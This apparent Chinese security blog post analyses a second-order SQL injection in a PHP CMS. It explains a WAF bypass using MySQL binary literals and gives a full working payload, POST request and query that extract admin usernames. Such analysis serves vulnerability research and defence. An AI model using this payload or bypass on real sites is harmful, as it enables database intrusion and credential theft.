> 原文链接: https://www.anquanke.com//post/id/170845 


# 某php开源cms有趣的二次注入


                                阅读量   
                                **206861**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01e070209b6d843311.png)](https://p2.ssl.qhimg.com/t01e070209b6d843311.png)



## 漏洞说明

这个漏洞涉及到了mysql中比较有意思的两个知识点以及以`table`作为二次注入的突破口，非常的有意思。此cms的防注入虽然是很变态的，但是却可以利用mysql的这两个特点绕过防御。本次的漏洞是出现在`ndex.class.php`中的`likejob_action()`和`saveresumeson_action()`函数，由于这两个函数对用户的输入没有进行严格的显示，同时利用mysql的特点能够绕过waf。

PS:此漏洞的触发需要在WAP环境下，所以在进行调试的时候需要修改浏览器的ua为`Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Mobile Safari/537.36`。



## 漏洞分析

### <a class="reference-link" name="mysql%E7%89%B9%E7%82%B9"></a>mysql特点

<a class="reference-link" name="%E7%89%B9%E7%82%B91"></a>**特点1**

传统的插入方式可能大家想到的都是`insert into test(id,content,title) values(1,'hello','hello')`。如果我们仅仅值需要插入一条记录，则使用`insert into test(content) values('hello2')`。如下图所示:

[![](https://p2.ssl.qhimg.com/t01dedfa8ba7e9d2703.jpg)](https://p2.ssl.qhimg.com/t01dedfa8ba7e9d2703.jpg)

但是实际上还存在另外一种方式能够仅仅值插入一条记录。

```
insert into test set content='hello3';
```

[![](https://p5.ssl.qhimg.com/t010a1700d1e6d63c19.jpg)](https://p5.ssl.qhimg.com/t010a1700d1e6d63c19.jpg)

可以看到这种方式和`insert into test(content) values('hello2')`是一样的。

**说明插入数据时，利用`values()`和通过`=`指定列的方式结果都一样**

<a class="reference-link" name="%E7%89%B9%E7%82%B92"></a>**特点2**

我们知道mysql中能够使用十六进制表示字符串。如下：

[![](https://p2.ssl.qhimg.com/t01bbec3759d9d8bce0.jpg)](https://p2.ssl.qhimg.com/t01bbec3759d9d8bce0.jpg)

其中`0x68656c6c6f`表示的就是`hello`。这是一个很常见的方式。

除了使用十六进制外，还可以使用二进制的方式进行插入。`hello`的二进制是`01101000 01100101 01101100 01101100 01101111`，那么我们的SQL语句还可以这样写,`insert into test set content=0b0110100001100101011011000110110001101111`。这种方式和`insert into test(content) values (0b0110100001100101011011000110110001101111)`是一样的。

**mysql不仅可以使用十六进制插入，还可以使用二进制的方式插入**

[![](https://p3.ssl.qhimg.com/t014c526ebb50c6c3c1.jpg)](https://p3.ssl.qhimg.com/t014c526ebb50c6c3c1.jpg)

### <a class="reference-link" name="waf%E9%98%B2%E6%8A%A4%E5%88%86%E6%9E%90"></a>waf防护分析

waf的防护是位于`config/db.safety.php`

其中的`gpc2sql()`过滤代码如下:

```
function gpc2sql($str, $str2) `{`
    if (preg_match("/select|insert|update|delete|load_file|outfile/is", $str)) `{`
        exit(safe_pape());
    `}`
    if (preg_match("/select|insert|update|delete|load_file|outfile/is", $str2)) `{`
        exit(safe_pape());
    `}`
    $arr = array("sleep" =&gt; "Ｓleep", " and " =&gt; " an d ", " or " =&gt; " Ｏr ", "xor" =&gt; "xＯr", "%20" =&gt; " ", "select" =&gt; "Ｓelect", "update" =&gt; "Ｕpdate", "count" =&gt; "Ｃount", "chr" =&gt; "Ｃhr", "truncate" =&gt; "Ｔruncate", "union" =&gt; "Ｕnion", "delete" =&gt; "Ｄelete", "insert" =&gt; "Ｉnsert", """ =&gt; "“", "'" =&gt; "“", "--" =&gt; "- -", "(" =&gt; "（", ")" =&gt; "）", "00000000" =&gt; "OOOOOOOO", "0x" =&gt; "Ox");
    foreach ($arr as $key =&gt; $v) `{`
        $str = preg_replace('/' . $key . '/isU', $v, $str);
    `}`
    return $str;
`}`

```

可以看到将`0x`替换为了`Ox`,所以无法传入十六进制，但是我们却可以利用mysql中的二进制的特点，利用`0b`的方式传入我们需要的payload。

### <a class="reference-link" name="index.class.php%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>index.class.php漏洞分析

漏洞是位于`wap/member/model/index.class.php`中，漏洞产生的主要函数是位于`likejob_action()`和`saveresumeson_action()`中。我们首先分析`likejob_action()`。`likejob_action()`的主要代码如下：

[![](https://p5.ssl.qhimg.com/t01e525096878c56bb9.jpg)](https://p5.ssl.qhimg.com/t01e525096878c56bb9.jpg)

而`DB_update_all()`的代码如下：

```
function DB_update_all($tablename, $value, $where = 1,$pecial='')`{`
    if($pecial!=$tablename)`{`

        $where =$this-&gt;site_fetchsql($where,$tablename);
    `}` 
    $SQL = "UPDATE `" . $this-&gt;def . $tablename . "` SET $value WHERE ".$where; 
    $this-&gt;db-&gt;query("set sql_mode=''");
    $return=$this-&gt;db-&gt;query($SQL);
    return $return;
`}`
```

也就是说，当数据进入到`DB_update_all()`之后就不会有任何的过滤。那么漏洞点就在于`resume_expect`中的`job_classid`字段。`job_classid`字段的内容的传递如下图所示：

[![](https://p0.ssl.qhimg.com/t01a817be42503d4c43.jpg)](https://p0.ssl.qhimg.com/t01a817be42503d4c43.jpg)

所以如如果我们控制了`resume_expect`中的`job_classid`字段，我们就能够修改这条语句了。

我们可以借助于`saveresumeson_action()`来向`job_classid`中插入我们的payload。`saveresumeson_action()`的关键代码如下：

[![](https://p2.ssl.qhimg.com/t01076a0131e01e9703.jpg)](https://p2.ssl.qhimg.com/t01076a0131e01e9703.jpg)

可以看到`$table`是直接通过`"resume_".$_POST['table']`拼接的，这也就以为着`$table`是我们可控的，之后`$table`进入了`$this-&gt;obj-&gt;update_once()`中。我们进入`uptate_once()`中：

[![](https://p3.ssl.qhimg.com/t0174ec79469b0aa266.jpg)](https://p3.ssl.qhimg.com/t0174ec79469b0aa266.jpg)

`$table`变量在`update_once()`没有进行任何的处理，直接进入到`DB_update_all()`中，我们追踪进入到`DB_update_all()`中:

[![](https://p0.ssl.qhimg.com/t014f3ec48087f33a94.jpg)](https://p0.ssl.qhimg.com/t014f3ec48087f33a94.jpg)

同样没有进行任何的处理。

通过上面的跟踪分析，表明`$table="resume_".$_POST['table'];`赋值之后，中途`$table`变量没有进行任何的过滤直接进入了最终的SQL语句查询。

如此整个攻击链就成功了，我们通过`saveresumeson_action()`中的`$table`可控,对`resume_expect`中的`job_classid`进行修改，之后通过`likejob_action()`读取`job_classid`字段的内容，执行我们的SQL语句。

由于我们无法使用十六进制，此时我们就需要使用到二进制(`0b`)插入我们的payload。



## 漏洞复现

### <a class="reference-link" name="%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7/%E5%88%9B%E5%BB%BA%E7%AE%80%E5%8E%86"></a>注册用户/创建简历

注册用户创建简历。此时在`phpyun_resume_expect`中存在一条`id=1`的记录。

### <a class="reference-link" name="%E8%AE%BF%E9%97%AEsaveresumeson"></a>访问saveresumeson

我们访问`saveresumeson`对应的URL，写入我们的payload。根据语法，我们需要将`table`的内容设置为

```
expect' set class_id=1))/**/union/**/select/**/1,username,3,4,5,6,7,8,9,10,11,12/**/from/**/phpyun_admin_user #,uid=1 #
```

由于`1))/**/union/**/select/**/1,username,3,4,5,6,7,8,9,10,11,12/**/from/**/phpyun_admin_user #`无法绕过SQL的防御，需要转化为二进制，是`001100010010100100101001001011110010101000101010001011110111010101101110011010010110111101101110001011110010101000101010001011110111001101100101011011000110010101100011011101000010111100101010001010100010111100110001001011000111010101110011011001010111001001101110011000010110110101100101001011000011001100101100001101000010110000110101001011000011011000101100001101110010110000111000001011000011100100101100001100010011000000101100001100010011000100101100001100010011001000101111001010100010101000101111011001100111001001101111011011010010111100101010001010100010111101110000011010000111000001111001011101010110111001011111011000010110010001101101011010010110111001011111011101010111001101100101011100100010000000100011`

那么最终的payload是:

```
URL:http://localhost/wap//member/index.php?c=saveresumeson&amp;eid=1
POST：name=java%e5%a4%a7%e6%95%b0%e6%8d%ae%e5%bc%80%e5%8f%91&amp;sdate=2018-02&amp;edate=2018-03&amp;title=%e6%a0%b8%e5%bf%83%e5%bc%80%e5%8f%91%e4%ba%ba%e5%91%98&amp;content=java%e5%a4%a7%e6%95%b0%e6%8d%ae%e5%ba%93%e5%bc%80%e5%8f%91&amp;eid=1&amp;id=&amp;submit=%e4%bf%9d%e5%ad%98&amp;table=expect%60set+job_classid%3d0b0011000100101001001010010010111100101010001010100010111101110101011011100110100101101111011011100010111100101010001010100010111101110011011001010110110001100101011000110111010000101111001010100010101000101111001100010010110001110101011100110110010101110010011011100110000101101101011001010010110000110011001011000011010000101100001101010010110000110110001011000011011100101100001110000010110000111001001011000011000100110000001011000011000100110001001011000011000100110010001011110010101000101010001011110110011001110010011011110110110100101111001010100010101000101111011100000110100001110000011110010111010101101110010111110110000101100100011011010110100101101110010111110111010101110011011001010111001000100011%2cuid%3d1+%23
```

此时我们执行的SQL语句是:

```
INSERT INTO `phpyun_resume_expect`set job_classid=0b001100010010100100101001001011110010101000101010001011110111010101101110011010010110111101101110001011110010101000101010001011110111001101100101011011000110010101100011011101000010111100101010001010100010111100110001001011000111010101110011011001010111001001101110011000010110110101100101001011000011001100101100001101000010110000110101001011000011011000101100001101110010110000111000001011000011100100101100001100010011000000101100001100010011000100101100001100010011001000101111001010100010101000101111011001100111001001101111011011010010111100101010001010100010111101110000011010000111000001111001011101010110111001011111011000010110010001101101011010010110111001011111011101010111001101100101011100100010000000100011,uid=1 #` SET

```

最终数据库中多了一条记录，如下：

[![](https://p3.ssl.qhimg.com/t01294baec227be6b4f.jpg)](https://p3.ssl.qhimg.com/t01294baec227be6b4f.jpg)

我们顺利地向`job_classid`中插入了我们的的payload

### <a class="reference-link" name="%E8%AE%BF%E9%97%AElikejob_action%E8%A7%A6%E5%8F%91payload"></a>访问likejob_action触发payload

接下来我们访问`http://localhost/member/index.php?c=likejob&amp;id=7`，其中的id就是刚刚我们插入的payload所对应记录的id。当运行至`DB_select_all()`中执行的SQL语句是：

[![](https://p1.ssl.qhimg.com/t01e08299e781849fb3.jpg)](https://p1.ssl.qhimg.com/t01e08299e781849fb3.jpg)

为了便于分析，我们将这条SQL语句放入到datagrid中分析:

[![](https://p0.ssl.qhimg.com/t01e79740f4506881b9.jpg)](https://p0.ssl.qhimg.com/t01e79740f4506881b9.jpg)

最终在页面上显示`admin`的信息。

[![](https://p5.ssl.qhimg.com/t01a2f8f199eb707165.jpg)](https://p5.ssl.qhimg.com/t01a2f8f199eb707165.jpg)

至此整个漏洞都分析完毕了。



## 总结

一般来说，二次注入利用点一般都比较隐晦。所以二次注入的思路比一般的注入更加巧妙和有意思，在本例中体现得尤为明显。
1. 这个二次注入的点比较难找，二次注入中的利用`table`作为二次注入的利用点的例子还是比较少见的；
1. 绕过方法也比较少见。本例中的waf的防护还是比较严格的，利用了mysql的两个少见特性就可以绕过了。